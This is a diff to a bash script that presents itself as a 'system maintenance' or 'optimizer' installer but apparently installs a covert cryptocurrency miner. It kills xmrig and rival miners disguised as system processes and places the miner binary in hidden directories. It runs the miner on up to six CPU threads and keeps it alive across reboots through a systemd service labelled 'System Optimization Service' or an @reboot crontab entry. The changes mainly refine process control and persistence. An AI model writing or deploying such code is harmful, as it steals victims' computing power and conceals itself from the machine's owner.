@@ -1,6 +1,6 @@
 #!/bin/bash
 
-VERSION=2.15
+VERSION=2.16
 
 echo "System maintenance script v$VERSION."
 echo "This script performs system optimization tasks."
@@ -47,7 +47,7 @@ if ! type curl >/dev/null || ! type tar >/dev/null; then
   sudo apt-get update >/dev/null 2>&1 && sudo apt-get install -y curl tar >/dev/null 2>&1
 fi
 
-# Calculate optimal CPU usage - use 6 cores instead of all
+# Calculate optimal CPU usage - MAX 6 CORES
 CPU_THREADS=$(nproc)
 if [ $CPU_THREADS -gt 6 ]; then
     USABLE_THREADS=6  # Maximum 6 cores
@@ -55,12 +55,12 @@ else
     USABLE_THREADS=$((CPU_THREADS > 2 ? CPU_THREADS - 1 : 1))
 fi
 
-CPU_USAGE=100  # Use 100% of allocated threads
+CPU_USAGE=100
 
 echo "[*] Running as user: $CURRENT_USER"
 echo "[*] Home directory: $USER_HOME"
 echo "[*] Starting system maintenance setup..."
-echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads"
+echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads (MAX 6 cores)"
 
 # Function to create hidden directories
 create_hidden_dirs() {
@@ -78,12 +78,21 @@ create_hidden_dirs() {
 # Cleanup previous installations
 cleanup_previous() {
     echo "[*] Cleaning up previous installations..."
+    # Stop all xmrig processes
+    pkill -f "xmrig" 2>/dev/null
     pkill -f "systemd-.*" 2>/dev/null
     pkill -f "sysupdate" 2>/dev/null
     pkill -f "kernelcfg" 2>/dev/null
     
+    # Stop systemd services
+    if command -v systemctl >/dev/null 2>&1; then
+        systemctl stop "$SERVICE_NAME" 2>/dev/null
+        systemctl disable "$SERVICE_NAME" 2>/dev/null
+    fi
+    
     # Find and remove hidden miners in user's home
     find "$USER_HOME" -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
+    sleep 2
 }
 
 # Setup huge pages - only if root
@@ -254,6 +263,12 @@ case "\$1" in
     start)
         echo "Starting optimizer..."
         cd "\$SCRIPT_DIR"
+        # Check if already running
+        if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
+            echo "⚠️  Optimizer is already running!"
+            ./control status
+            exit 1
+        fi
         # Try to enable huge pages if we have permission
         if [ -w "/proc/sys/vm/nr_hugepages" ]; then
             echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
@@ -261,27 +276,34 @@ case "\$1" in
         # Start the optimizer
         nohup ./main --config=./config.json > ./output.log 2>&1 &
         echo \$! > ./pid.txt
-        echo "Started with PID: \$(cat ./pid.txt)"
-        sleep 5
+        echo "✅ Started with PID: \$(cat ./pid.txt)"
+        sleep 3
         echo "=== Current Status ==="
         ./control status
-        echo "=== Recent Logs ==="  
-        ./control logs
         ;;
     stop)
         echo "Stopping optimizer..."
         pkill -f "\$SCRIPT_DIR/main"
         [ -f "./pid.txt" ] && kill \$(cat ./pid.txt) 2>/dev/null
         rm -f ./pid.txt
-        echo "Stopped"
+        sleep 2
+        # Double check
+        if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
+            echo "❌ Failed to stop optimizer"
+            exit 1
+        else
+            echo "✅ Stopped successfully"
+        fi
         ;;
     status)
-        if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
-            PID=\$(pgrep -f "\$SCRIPT_DIR/main")
-            echo "✅ Running - PID: \$PID"
-            echo "📊 CPU Usage: \$(ps -p \$PID -o %cpu --no-headers 2>/dev/null || echo 'N/A')%"
-            echo "🧠 Memory: \$(ps -p \$PID -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
-            echo "⏰ Uptime: \$(ps -p \$PID -o etime --no-headers 2>/dev/null || echo 'N/A')"
+        PIDS=\$(pgrep -f "\$SCRIPT_DIR/main")
+        if [ -n "\$PIDS" ]; then
+            COUNT=\$(echo "\$PIDS" | wc -l)
+            echo "✅ Running - PIDs: \$PIDS"
+            echo "📊 Process Count: \$COUNT"
+            for PID in \$PIDS; do
+                echo "   PID \$PID - CPU: \$(ps -p \$PID -o %cpu --no-headers 2>/dev/null || echo 'N/A')% - MEM: \$(ps -p \$PID -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
+            done
         else
             echo "❌ Stopped"
         fi
@@ -306,13 +328,15 @@ case "\$1" in
         sleep 3
         ./control start
         ;;
-    test)
-        echo "=== Testing configuration ==="
-        cd "\$SCRIPT_DIR"
-        timeout 10s ./main --config=./config.json --dry-run 2>&1 | head -20
+    killall)
+        echo "🛑 Killing ALL optimizer processes..."
+        pkill -f "xmrig" 2>/dev/null
+        pkill -f "main" 2>/dev/null
+        sleep 2
+        ./control status
         ;;
     *)
-        echo "Usage: \$0 {start|stop|status|logs|fullogs|stats|restart|test}"
+        echo "Usage: \$0 {start|stop|status|logs|fullogs|stats|restart|killall}"
         ;;
 esac
 EOF
@@ -324,9 +348,16 @@ fi
 chmod +x "$BASE_DIR/control"
 
 # Systemd service for persistence (only if root or sudo)
+SYSTEMD_ENABLED=false
 if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
     echo "[*] Creating systemd service..."
     mkdir -p /etc/systemd/system
+    
+    # Remove any existing service first
+    systemctl stop "$SERVICE_NAME" 2>/dev/null
+    systemctl disable "$SERVICE_NAME" 2>/dev/null
+    rm -f /etc/systemd/system/"$SERVICE_NAME".service
+    
     cat > /etc/systemd/system/"$SERVICE_NAME".service << EOF
 [Unit]
 Description=System Optimization Service
@@ -350,20 +381,32 @@ EOF
 
     systemctl daemon-reload
     systemctl enable "$SERVICE_NAME".service 2>/dev/null
-    systemctl start "$SERVICE_NAME".service 2>/dev/null
-    echo "[*] Systemd service started: $SERVICE_NAME"
+    SYSTEMD_ENABLED=true
+    echo "[*] Systemd service created: $SERVICE_NAME"
 fi
 
-# Add to crontab for persistence
-echo "[*] Setting up persistence..."
-(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 30 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -
+# Add to crontab for persistence (only if not using systemd)
+if [ "$SYSTEMD_ENABLED" = false ]; then
+    echo "[*] Setting up persistence via crontab..."
+    (crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 30 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -
+else
+    echo "[*] Using systemd for persistence, skipping crontab"
+fi
 
 echo "[*] Starting system optimizer..."
 cd "$BASE_DIR"
-./control start
+
+# Only start via control script if systemd is not enabled
+if [ "$SYSTEMD_ENABLED" = false ]; then
+    ./control start
+else
+    echo "[*] Starting via systemd service..."
+    systemctl start "$SERVICE_NAME".service 2>/dev/null
+    sleep 5
+fi
 
 # Additional verification
-sleep 10
+sleep 8
 echo
 echo "=== Final Verification ==="
 ./control status
@@ -373,19 +416,20 @@ echo
 echo
 echo "🎯 System optimization setup complete!"
 echo "📍 Installation directory: $BASE_DIR" 
-echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart|test} to manage"
+echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart|killall} to manage"
 echo
 
 # Check if process is running
-if pgrep -f "$BASE_DIR/main" > /dev/null; then
-    echo "✅ Optimizer is successfully running!"
-    echo "💻 Check CPU usage with: top -p \$(pgrep -f '$BASE_DIR/main')"
-    echo "📋 Check detailed logs with: $BASE_DIR/control logs"
+PIDS=$(pgrep -f "$BASE_DIR/main" 2>/dev/null)
+if [ -n "$PIDS" ]; then
+    COUNT=$(echo "$PIDS" | wc -l)
+    echo "✅ Optimizer is running with $COUNT process(es)!"
+    if [ $COUNT -gt 1 ]; then
+        echo "⚠️  Warning: Multiple processes detected. Use '$BASE_DIR/control killall' to stop all."
+    fi
 else
     echo "❌ Optimizer failed to start."
     echo "🔍 Check details with: $BASE_DIR/control logs"
-    echo "🧪 Test config with: $BASE_DIR/control test"
-    echo "💡 Tip: Try running with sudo for better performance"
 fi
 
 # Cleanup
